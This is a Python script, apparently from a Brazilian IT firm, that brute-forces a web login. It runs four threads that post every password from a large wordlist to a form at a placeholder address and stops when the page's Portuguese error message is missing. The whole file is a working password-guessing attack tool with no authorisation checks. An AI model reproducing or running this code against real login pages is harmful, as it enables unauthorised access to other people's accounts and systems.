# -*- coding: utf8 -*-
# Citra IT - Excelencia em TI
# Script para brute force de senha. 
# @Version: 1.0
# @Date: 20/11/2022
# @Usage: python brute_site.py

import os, sys
import time
import requests
import random
from threading import Thread, Semaphore
import signal


TARGET_URL = 'http://<IP-ADDR>/acesso.php/'
# DICT = r'C:\Users\luciano\Documents\Tools\wordlists\rockyou.txt'
DICT = r'C:\Users\hackerman\Documents\Tools\wordlists\1000000-password-seclists.txt'

# how many threads to work 'simultaneous'
MAX_THREADS = 4

# hold if the password is not found yet
pass_found = False


# worker thread to read a password at time and try it against the target website
def worker(tid, f_handle, s):
    print(f'starting thread {tid}')
    global pass_found
    global TARGET_URL
    http_sess = requests.Session()
    while(True):
        # check if someone else cracked the password
        if pass_found:
            break
            
        # acquire lock and read a line from dict file
        s.acquire()
        line = f_handle.readline()
        s.release()

        # check if end of file
        if line == '':
            print(f't{tid} reached end of file')
            break
        
        # make the request
        line = line.strip()
        cust_headers = {
            'content-type': 'application/x-www-form-urlencoded', 
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'
        }
        
        # send it
        try:
            req = http_sess.post(TARGET_URL, headers=cust_headers, data=f'password={line}')
        except Exception as e:
            print(f't{tid} AN EXCEPTION HAS OCURRED. Details:')
            print(str(e))
            
            
        
        # evaluate response
        if 'deve digitar a senha para executar essa' in req.text:
            pass
        else:
            print(f'found password: {line}')
            pass_found = True
            break
        
        
    
# handle signal SIGINT (signal interrup - abrupt stop)    
def handle_sigint(sigint, test):
    print(f'received SIGINT... exiting..')
    sys.exit(0)





#########     MAIN  ROUTINE   ##########
if __name__ == '__main__':
    print(f'setup signal')
    signal.signal(signal.Signals.SIGINT, handle_sigint)
    print(f'starting brute script...')
    
    # read dict
    print(f'opening dict {DICT}')
    f = open(DICT)

    # creating thread workers
    print(f'using {MAX_THREADS} threads')
    threads = []
    semaphore = Semaphore()
    for i in range(MAX_THREADS):
        threads.append( Thread(target=worker, args=(i,f, semaphore)) )
        threads[i].start()
   
    
    # print(f'==== ALL THREADS STARTED')
    print(f'working...')
    for i in threads:
        i.join()
        
    # time to cleanup after some work
    # close all open files (handles)
    print(f'all threads finished!')
    f.close()
    print(f'exiting')
    sys.exit(0)
    
    
